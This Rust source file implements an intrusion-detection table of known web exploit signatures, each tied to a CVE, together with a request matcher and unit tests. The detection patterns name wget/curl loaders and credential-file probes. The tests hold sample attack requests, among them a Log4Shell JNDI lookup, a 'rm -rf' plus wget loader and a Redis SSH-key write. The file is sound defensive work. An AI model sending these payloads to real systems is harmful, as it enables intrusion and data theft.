// SPDX-FileCopyrightText: 2024-2026 Temps Contributors
// SPDX-License-Identifier: MIT OR Apache-2.0

//! Well-known exploit attempts, recognised in a request (ADR 066, D8).
//!
//! The table came from netwatch, which matches it against the first bytes a
//! client sends; Shield matches it against the parts of each request a proxy
//! has already parsed ([`match_parts`]), so it sees HTTPS too. Both use this
//! one table.
//!
//! Each signature is a list of conditions that must all hold; a condition
//! holds when any of its needles appears in the request, lowercased, as sent
//! and after one and two rounds of percent-decoding (scanners double-encode).

#[derive(Debug, PartialEq)]
pub struct Signature {
    pub id: &'static str,
    pub cve: Option<&'static str>,
    pub name: &'static str,
    /// Finding score. Exploits 70–80; probes for leaked files are lower.
    pub score: u32,
    all: &'static [&'static [&'static str]],
}

impl Signature {
    /// Probing for something to exploit, not an exploit payload.
    pub fn recon(&self) -> bool {
        self.score < 50
    }

    /// Whether the signature describes a request to a web application, as
    /// opposed to a raw service on its own port (the Docker Engine API, YARN,
    /// Redis). Those paths and commands are also what legitimate apps
    /// served behind a proxy send (a container manager calls
    /// `/containers/create`), so Shield leaves them to netwatch.
    pub fn applies_to_web_apps(&self) -> bool {
        !matches!(self.id, "docker-api" | "hadoop-yarn" | "redis-rce")
    }

    /// "CVE-2021-41773 Apache HTTP Server path traversal" or just the name.
    pub fn label(&self) -> String {
        match self.cve {
            Some(c) => format!("{c} {}", self.name),
            None => self.name.to_string(),
        }
    }
}

const fn sig(
    id: &'static str,
    cve: Option<&'static str>,
    name: &'static str,
    score: u32,
    all: &'static [&'static [&'static str]],
) -> Signature {
    Signature {
        id,
        cve,
        name,
        score,
        all,
    }
}

/// Specific signatures first; the generic ones at the end only name what nothing else did.
pub static SIGNATURES: &[Signature] = &[
    // Injection anywhere in the request line or headers.
    sig(
        "log4shell",
        Some("CVE-2021-44228"),
        "Log4Shell (Log4j JNDI lookup)",
        80,
        &[&[
            "${jndi:",
            "${${::-j}",
            "${${lower:j}",
            "${${env:",
            "${${upper:j}",
        ]],
    ),
    sig(
        "shellshock",
        Some("CVE-2014-6271"),
        "Shellshock (bash function in a header)",
        75,
        &[&["() { :", "() {:;", "() { _;"]],
    ),
    sig(
        "confluence-ognl",
        Some("CVE-2022-26134"),
        "Confluence OGNL injection",
        80,
        &[&["/${", "/%24%7b"], &["runtime", "@java", "ognl", ".exec("]],
    ),
    sig(
        "struts-ognl",
        Some("CVE-2017-5638"),
        "Apache Struts OGNL injection",
        80,
        &[&["#_memberaccess", "@ognl", "ognlcontext"]],
    ),
    sig(
        "spring4shell",
        Some("CVE-2022-22965"),
        "Spring4Shell (Spring Framework RCE)",
        80,
        &[&["class.module.classloader"]],
    ),
    sig(
        "spring-cloud-function",
        Some("CVE-2022-22963"),
        "Spring Cloud Function SpEL injection",
        80,
        &[&["spring.cloud.function.routing-expression"]],
    ),
    sig(
        "spring-cloud-gateway",
        Some("CVE-2022-22947"),
        "Spring Cloud Gateway actuator RCE",
        75,
        &[&["/actuator/gateway/routes"]],
    ),
    sig(
        "php-cgi",
        Some("CVE-2024-4577"),
        "PHP-CGI argument injection",
        80,
        &[&["allow_url_include", "auto_prepend_file=php://input"]],
    ),
    sig(
        "phpunit",
        Some("CVE-2017-9841"),
        "PHPUnit eval-stdin RCE",
        75,
        &[&["eval-stdin.php"]],
    ),
    sig(
        "thinkphp",
        Some("CVE-2018-20062"),
        "ThinkPHP invokefunction RCE",
        75,
        &[&["invokefunction"], &["think"]],
    ),
    sig(
        "laravel-ignition",
        Some("CVE-2021-3129"),
        "Laravel Ignition RCE",
        75,
        &[&["/_ignition/execute-solution"]],
    ),
    sig(
        "drupalgeddon2",
        Some("CVE-2018-7600"),
        "Drupalgeddon2 (Drupal form API RCE)",
        80,
        &[&["#post_render", "#lazy_builder", "[#markup]"]],
    ),
    sig(
        "vbulletin",
        Some("CVE-2019-16759"),
        "vBulletin widget RCE",
        80,
        &[&["widgetconfig[code]", "ajax/render/widget_php"]],
    ),
    sig(
        "joomla-config",
        Some("CVE-2023-23752"),
        "Joomla config disclosure",
        70,
        &[&["/api/index.php/v1/config/application"]],
    ),
    sig(
        "nextjs-middleware",
        Some("CVE-2025-29927"),
        "Next.js middleware auth bypass",
        70,
        &[&["x-middleware-subrequest"]],
    ),
    sig(
        "react2shell",
        Some("CVE-2025-55182"),
        "React Server Components RCE (React2Shell)",
        80,
        &[&["next-action", "rsc-action-id"], &["__proto__"]],
    ),
    // Apache and Java application servers.
    sig(
        "apache-traversal",
        Some("CVE-2021-41773"),
        "Apache HTTP Server path traversal / RCE",
        80,
        &[&[
            "/cgi-bin/.%2e/",
            "/icons/.%2e/",
            "/cgi-bin/%2e%2e/",
            "/icons/%2e%2e/",
            ".%%32%65/",
        ]],
    ),
    sig(
        "weblogic-console",
        Some("CVE-2020-14882"),
        "WebLogic console auth bypass",
        80,
        &[&[
            "/console/css/../",
            "/console/images/../",
            "consolejndi.portal",
        ]],
    ),
    sig(
        "weblogic-wls-wsat",
        Some("CVE-2017-10271"),
        "WebLogic WLS-WSAT XMLDecoder RCE",
        80,
        &[&["/wls-wsat/coordinatorporttype"]],
    ),
    sig(
        "liferay",
        Some("CVE-2020-7961"),
        "Liferay JSON web services RCE",
        75,
        &[&["/api/jsonws/invoke"]],
    ),
    sig(
        "ofbiz",
        Some("CVE-2023-51467"),
        "Apache OFBiz auth bypass",
        80,
        &[
            &["/webtools/control/"],
            &["requirepasswordchange=y", "programexport"],
        ],
    ),
    sig(
        "geoserver",
        Some("CVE-2024-36401"),
        "GeoServer property evaluation RCE",
        80,
        &[
            &["/geoserver/"],
            &["exec(java.lang.runtime", "valuereference=exec"],
        ],
    ),
    sig(
        "grafana-traversal",
        Some("CVE-2021-43798"),
        "Grafana plugin path traversal",
        75,
        &[&["/public/plugins/"], &["../"]],
    ),
    sig(
        "teamcity-auth",
        Some("CVE-2023-42793"),
        "TeamCity auth bypass",
        80,
        &[&["/app/rest/users/id:1/tokens/rpc2"]],
    ),
    sig(
        "openfire",
        Some("CVE-2023-32315"),
        "Openfire admin console path traversal",
        75,
        &[&["setup-s/%u002e%u002e/"]],
    ),
    sig(
        "confluence-setup",
        Some("CVE-2023-22515"),
        "Confluence setup broken access control",
        80,
        &[&[
            "bootstrapstatusprovider.applicationconfig",
            "setupcomplete=false",
        ]],
    ),
    sig(
        "confluence-template",
        Some("CVE-2023-22527"),
        "Confluence template injection",
        80,
        &[&["/template/aui/text-inline.vm"]],
    ),
    sig(
        "sap-netweaver",
        Some("CVE-2025-31324"),
        "SAP NetWeaver metadata uploader RCE",
        80,
        &[&["/developmentserver/metadatauploader"]],
    ),
    // VPNs, firewalls and appliances.
    sig(
        "fortios-traversal",
        Some("CVE-2018-13379"),
        "FortiOS SSL VPN path traversal",
        80,
        &[&["/remote/fgt_lang"], &["../"]],
    ),
    sig(
        "fortiweb",
        Some("CVE-2025-64446"),
        "FortiWeb path traversal to fwbcgi",
        80,
        &[&["/cgi-bin/fwbcgi"]],
    ),
    sig(
        "pulse-secure",
        Some("CVE-2019-11510"),
        "Pulse Secure VPN file read",
        80,
        &[&["/dana-na/"], &["../"]],
    ),
    sig(
        "ivanti-totp",
        Some("CVE-2023-46805"),
        "Ivanti Connect Secure auth bypass",
        80,
        &[&["/api/v1/totp/user-backup-code/"], &["../"]],
    ),
    sig(
        "ivanti-license",
        Some("CVE-2024-21887"),
        "Ivanti Connect Secure command injection",
        80,
        &[&["/api/v1/license/keys-status/"]],
    ),
    sig(
        "citrix-traversal",
        Some("CVE-2019-19781"),
        "Citrix ADC path traversal",
        80,
        &[&[
            "/vpn/../vpns/",
            "/vpns/portal/scripts/",
            "/vpns/cfg/smb.conf",
        ]],
    ),
    sig(
        "panos-globalprotect",
        Some("CVE-2024-3400"),
        "PAN-OS GlobalProtect command injection",
        80,
        &[&["sessid=/../", "sessid=../"]],
    ),
    sig(
        "panos-authcheck",
        Some("CVE-2024-0012"),
        "PAN-OS management auth bypass",
        80,
        &[&["x-pan-authcheck: off", "x-pan-authcheck:off"]],
    ),
    sig(
        "f5-bigip-bash",
        Some("CVE-2022-1388"),
        "F5 BIG-IP iControl REST auth bypass",
        80,
        &[&["/mgmt/tm/util/bash"]],
    ),
    sig(
        "f5-bigip-tmui",
        Some("CVE-2020-5902"),
        "F5 BIG-IP TMUI RCE",
        80,
        &[&["/tmui/login.jsp/..;/"]],
    ),
    sig(
        "checkpoint",
        Some("CVE-2024-24919"),
        "Check Point gateway file read",
        75,
        &[&["/clients/mycrl"]],
    ),
    sig(
        "cisco-iosxe",
        Some("CVE-2023-20198"),
        "Cisco IOS XE web UI implant",
        80,
        &[&[
            "/webui/logoutconfirm.html?logon_hash",
            "/%2577eb%2575i_%2577sma_http",
        ]],
    ),
    sig(
        "vcenter-vrops",
        Some("CVE-2021-21972"),
        "VMware vCenter vROPs plugin upload RCE",
        80,
        &[&["/ui/vropspluginui/rest/services/"]],
    ),
    sig(
        "exchange-proxyshell",
        Some("CVE-2021-34473"),
        "Exchange ProxyShell",
        80,
        &[
            &["autodiscover.json"],
            &["/powershell", "/mapi/", "?@", "&email="],
        ],
    ),
    sig(
        "exchange-proxylogon",
        Some("CVE-2021-26855"),
        "Exchange ProxyLogon",
        80,
        &[&["/ecp/"], &["x-beresource", "x-anonresource"]],
    ),
    sig(
        "screenconnect",
        Some("CVE-2024-1709"),
        "ConnectWise ScreenConnect auth bypass",
        80,
        &[&["/setupwizard.aspx/"]],
    ),
    sig(
        "moveit",
        Some("CVE-2023-34362"),
        "MOVEit Transfer SQL injection",
        80,
        &[&["/moveitisapi/moveitisapi.dll", "/human2.aspx"]],
    ),
    // Routers, cameras and NAS (botnet loaders).
    sig(
        "hikvision",
        Some("CVE-2021-36260"),
        "Hikvision camera command injection",
        80,
        &[&["/sdk/weblanguage"]],
    ),
    sig(
        "gpon",
        Some("CVE-2018-10562"),
        "GPON router command injection",
        80,
        &[&["/gponform/diag_form"]],
    ),
    sig(
        "huawei-hg532",
        Some("CVE-2017-17215"),
        "Huawei HG532 router RCE",
        80,
        &[&["/ctrlt/deviceupgrade_1"]],
    ),
    sig(
        "realtek-sdk",
        Some("CVE-2014-8361"),
        "Realtek SDK miniigd command injection",
        80,
        &[&["/picsdesc.xml"], &["newinternalclient"]],
    ),
    sig(
        "dlink-hnap",
        Some("CVE-2015-2051"),
        "D-Link HNAP command injection",
        70,
        &[&["/hnap1"]],
    ),
    sig(
        "dlink-nas",
        Some("CVE-2024-3273"),
        "D-Link NAS command injection",
        80,
        &[&["/cgi-bin/nas_sharing.cgi"]],
    ),
    sig(
        "draytek",
        Some("CVE-2020-8515"),
        "DrayTek Vigor command injection",
        80,
        &[&["/cgi-bin/mainfunction.cgi"]],
    ),
    sig(
        "zyxel-ztp",
        Some("CVE-2022-30525"),
        "Zyxel firewall command injection",
        80,
        &[&["/ztp/cgi-bin/handler"]],
    ),
    sig(
        "netgear-setup",
        None,
        "Netgear setup.cgi command injection (Mozi botnet)",
        75,
        &[&["setup.cgi?next_file=netgear.cfg"]],
    ),
    // Exposed services.
    sig(
        "docker-api",
        None,
        "Docker Engine API container create (cryptominer drop)",
        80,
        &[&["/containers/create"]],
    ),
    sig(
        "hadoop-yarn",
        None,
        "Hadoop YARN unauthenticated job submission",
        75,
        &[&["/ws/v1/cluster/apps/new-application"]],
    ),
    sig(
        "redis-rce",
        None,
        "Redis unauthenticated write (config set / replicaof)",
        80,
        &[&[
            "config set dir",
            "config set dbfilename",
            "slaveof ",
            "replicaof ",
            "module load",
            // The same commands in RESP framing.
            "config\r\n$3\r\nset\r\n$3\r\ndir",
            "config\r\n$3\r\nset\r\n$10\r\ndbfilename",
            "$7\r\nslaveof\r\n",
            "$9\r\nreplicaof\r\n",
        ]],
    ),
    // Generic payloads.
    sig(
        "cmd-injection",
        None,
        "Command injection (wget/curl loader)",
        70,
        &[&[
            ";wget ",
            "|wget ",
            "`wget ",
            "$(wget ",
            ";curl ",
            "|curl ",
            "$(curl ",
            "cd /tmp;",
            "cd+/tmp",
            "chmod 777 ",
            "/bin/busybox ",
        ]],
    ),
    sig(
        "path-traversal",
        None,
        "Path traversal to system files",
        65,
        &[&[
            "/etc/passwd",
            "/etc/shadow",
            "win.ini",
            "/proc/self/environ",
        ]],
    ),
    // Reconnaissance: looking for leaked secrets or admin panels, not an exploit yet.
    sig(
        "secrets-probe",
        None,
        "Probe for leaked secrets (.env, .git, cloud keys)",
        35,
        &[&[
            "/.env",
            "/.git/config",
            "/.git/head",
            "/.aws/credentials",
            "/wp-config.php.bak",
            "/.ssh/id_",
        ]],
    ),
];

fn percent_decode(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'%' && i + 2 < b.len() {
            let hex = |c: u8| (c as char).to_digit(16);
            if let (Some(h), Some(l)) = (hex(b[i + 1]), hex(b[i + 2])) {
                out.push((h * 16 + l) as u8);
                i += 3;
                continue;
            }
        }
        out.push(b[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// The first signature the request matches.
pub fn match_request(data: &[u8]) -> Option<&'static Signature> {
    first_match(&String::from_utf8_lossy(data), |_| true)
}

/// The headers [`match_parts`] reads: where the exploits in the table put
/// their payloads, and few enough to copy on every request.
pub const MATCHED_HEADERS: [&str; 4] = ["user-agent", "referer", "x-api-version", "content-type"];

/// The first signature for a web application that a request matches, from
/// the parts a proxy has parsed: the method, the path with its query, and
/// the [`MATCHED_HEADERS`] (any others are ignored). The body is not read.
pub fn match_parts(
    method: &str,
    path_and_query: &str,
    headers: &[(&str, &str)],
) -> Option<&'static Signature> {
    let mut request = String::with_capacity(method.len() + path_and_query.len() + 64);
    request.push_str(method);
    request.push(' ');
    request.push_str(path_and_query);
    request.push_str(" HTTP/1.1\r\n");
    for (name, value) in headers {
        if MATCHED_HEADERS.iter().any(|h| name.eq_ignore_ascii_case(h)) {
            request.push_str(name);
            request.push_str(": ");
            request.push_str(value);
            request.push_str("\r\n");
        }
    }
    first_match(&request, Signature::applies_to_web_apps)
}

fn first_match(request: &str, eligible: impl Fn(&Signature) -> bool) -> Option<&'static Signature> {
    let raw = request.to_ascii_lowercase();
    let once = percent_decode(&raw).to_ascii_lowercase();
    let twice = percent_decode(&once).to_ascii_lowercase();
    let hay = [raw.as_str(), once.as_str(), twice.as_str()];
    SIGNATURES.iter().filter(|s| eligible(s)).find(|s| {
        s.all.iter().all(|any| {
            any.iter()
                .any(|needle| hay.iter().any(|h| h.contains(needle)))
        })
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn id(req: &str) -> Option<&'static str> {
        match_request(req.as_bytes()).map(|s| s.id)
    }

    #[test]
    fn known_exploits() {
        assert_eq!(
            id("GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1\r\nHost: x\r\n\r\n"),
            Some("apache-traversal")
        );
        assert_eq!(
            id("GET /cgi-bin/.%%32%65/.%%32%65/bin/sh HTTP/1.1\r\n\r\n"),
            Some("apache-traversal")
        );
        assert_eq!(
            id("GET / HTTP/1.1\r\nUser-Agent: ${jndi:ldap://1.2.3.4/a}\r\n\r\n"),
            Some("log4shell")
        );
        assert_eq!(
            id("GET /?x=%24%7Bjndi%3Aldap%3A%2F%2Fa%7D HTTP/1.1\r\n\r\n"),
            Some("log4shell")
        );
        assert_eq!(
            id("POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\r\n\r\n"),
            Some("phpunit")
        );
        assert_eq!(id("GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array HTTP/1.1\r\n\r\n"), Some("thinkphp"));
        assert_eq!(
            id("POST /GponForm/diag_Form?images/ HTTP/1.1\r\n\r\n"),
            Some("gpon")
        );
        assert_eq!(
            id("GET /shell?cd+/tmp;rm+-rf+*;wget+http://1.2.3.4/x HTTP/1.1\r\n\r\n"),
            Some("cmd-injection")
        );
        assert_eq!(
            id("GET /.env HTTP/1.1\r\nHost: kfs.es\r\n\r\n"),
            Some("secrets-probe")
        );
        assert_eq!(
            id("POST /hello.php?%ADd+allow_url_include%3d1 HTTP/1.1\r\n\r\n"),
            Some("php-cgi")
        );
        assert!(match_request(b"GET /.env HTTP/1.1\r\n\r\n")
            .unwrap()
            .recon());
        assert_eq!(
            id("*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$11\r\n/root/.ssh/\r\n"),
            Some("redis-rce")
        );
        let s = match_request(b"GET /mgmt/tm/util/bash HTTP/1.1\r\n\r\n").unwrap();
        assert_eq!(
            s.label(),
            "CVE-2022-1388 F5 BIG-IP iControl REST auth bypass"
        );
    }

    #[test]
    fn parts_match_like_the_request_they_came_from() {
        let parts = |method, path, headers: &[(&str, &str)]| {
            match_parts(method, path, headers).map(|s| s.id)
        };
        assert_eq!(
            parts("GET", "/cgi-bin/.%2e/.%2e/bin/sh", &[]),
            Some("apache-traversal")
        );
        assert_eq!(
            parts("GET", "/", &[("User-Agent", "${jndi:ldap://1.2.3.4/a}")]),
            Some("log4shell")
        );
        assert_eq!(parts("GET", "/.git/HEAD", &[]), Some("secrets-probe"));
        // Only the listed headers are read.
        assert_eq!(parts("GET", "/", &[("X-Custom", "${jndi:ldap://a}")]), None);
        // A container manager behind the proxy is not the Docker API.
        assert_eq!(
            parts("POST", "/api/endpoints/1/docker/containers/create", &[]),
            None
        );
        assert_eq!(
            id("POST /containers/create HTTP/1.1\r\n\r\n"),
            Some("docker-api")
        );
    }

    #[test]
    fn ordinary_requests() {
        for req in [
            "GET / HTTP/1.1\r\nHost: kfs.es\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
            "POST / HTTP/1.1\r\nHost: kfs.es\r\nUser-Agent: curl/8.5.0\r\nContent-Type: application/json\r\n\r\n{\"a\":1}",
            "GET /assets/index-DB-ShyH8.js HTTP/1.1\r\nHost: x\r\nAccept-Encoding: gzip\r\n\r\n",
            "GET /api/flows?window=1h&q=%2Fetc HTTP/1.1\r\nHost: x\r\n\r\n",
            "GET /environment HTTP/1.1\r\nUser-Agent: Wget/1.21\r\n\r\n",
        ] {
            assert_eq!(id(req), None, "{req}");
        }
    }
}
